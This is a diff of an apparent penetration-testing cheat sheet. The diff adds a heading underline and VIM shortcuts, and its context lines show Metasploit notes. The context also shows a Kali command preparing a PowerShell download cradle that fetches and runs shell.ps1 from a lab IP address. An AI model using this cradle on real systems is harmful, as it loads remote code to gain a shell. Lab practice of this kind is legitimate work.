@@ -25,7 +25,7 @@ mv exploit.rb ~/.msf4/modules/exploit/exploit.rb and msf > reload_all
 sessions -l :list sessions
 
 Convert to UTF-16LE
-
+===================
 {% highlight bash%}
 root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/shell.ps1')" | xxd | head -3
 00000000: 4945 5828 4e65 772d 4f62 6a65 6374 204e  IEX(New-Object N
@@ -116,6 +116,8 @@ VIM shortcut
 {% highlight bash%}
 gg            :beginning of the text
 dd            :delete line
+yy            :copy line
+p             :paste
 gg dG         :delete all
 g g " + y G   :yank all line 
 : % y +       :yank all line (shorter)
